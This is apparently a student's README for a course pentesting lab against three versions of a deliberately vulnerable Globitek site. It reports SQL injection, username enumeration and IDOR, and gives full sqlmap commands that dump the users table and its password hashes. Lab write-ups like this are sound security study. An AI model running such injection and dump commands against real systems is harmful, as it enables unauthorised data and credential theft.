# Project 8 - Pentesting Live Targets

Time spent: **20** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

IP Address: https://104.197.43.145

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQLi - The id parameter is unsanitized and escapable on the salepeople page.

GIF Walkthrough: <img src='http://i.imgur.com/qaOIRtL.gif' />

Vulnerability #2: __________________


## Green

Vulnerability #1: Username Enumeration - Error message switches between bold and regular depending if username exists or not.

GIF Walkthrough: <img src='http://i.imgur.com/UYoccrU.gif' />

Vulnerability #2: __________________


## Red

Vulnerability #1: IDOR - Hidden salespeople ids are accessible

GIF Walkthrough: <img src='http://i.imgur.com/lnQoU8t.gif' />

Vulnerability #2: __________________


## Notes

Describe any challenges encountered while doing the work

Could not do XSS, CSRF, or Session Hijacking/Fixation due to the exploits requring admin login. The hashed passwords were obtained from the database using sqlmap but the passwords are salted. The default Sqlmap version was also outdated and didn't work; had to install updated version from the official github link.

Sqlmap Installation Command:

```
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
``` 

*Note: Must navigate to the "sqlmap-dev" directory before executing the following command.

Sqlmap Command - Get databases from host 104.197.43.145: 

```
python2 sqlmap.py --url 'https://104.197.43.145/blue/public/salesperson.php?id=1' --cookie='security=low; PHPSESSID=5d1dmfg3ak225m3kmam8qkkat2' --dbs
```

Sqlmap Command - Get tables from database "globitek_blue":

```
python2 sqlmap.py --url 'https://104.197.43.145/blue/public/salesperson.php?id=1' --tables -D globitek_blue

```

Sqlmap Command - Get columns from table "users":

```
python2 sqlmap.py --url 'https://104.197.43.145/blue/public/salesperson.php?id=1' --columns -D globitek_blue -T users
```

Sqlmap Command - Dump table "users":

```
python2 sqlmap.py --url 'https://104.197.43.145/blue/public/salesperson.php?id=1' --dump -D globitek_blue -T users
```

Sqlmap Command - Dump column "hashed_password" from table "users":

```
python2 sqlmap.py --url 'https://104.197.43.145/blue/public/salesperson.php?id=1' --dump -D globitek_blue -T users -C hashed_password
```

GIF Walkthrough: <img src='http://i.imgur.com/6NCLBA1.gif' />